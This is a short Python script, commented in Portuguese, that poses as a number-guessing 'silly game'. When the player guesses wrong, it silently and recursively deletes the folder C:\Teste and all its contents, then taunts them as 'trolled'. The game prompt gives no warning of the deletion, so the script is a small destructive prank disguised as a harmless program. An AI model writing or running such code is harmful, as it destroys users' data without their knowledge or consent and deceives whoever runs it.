import random
import os
import shutil  # Necessário para remover pastas

numero = random.randint(1, 10)

adivinhe = int(input("Jogo bobo! Adivinhe um número entre 1 e 10: "))

if adivinhe == numero:
    print("Parabéns! Você Ganhou!")
else:
    caminho = r"C:\Teste"  # Caminho da pasta a ser removida
    if os.path.exists(caminho):  # Verifica se a pasta existe
        shutil.rmtree(caminho)  # Remove a pasta e todo o seu conteúdo
        print(f"A pasta {caminho} foi removida.")
    else:
        print("Você foi trolado, aguarde para saber o que irá ocorrer! ")
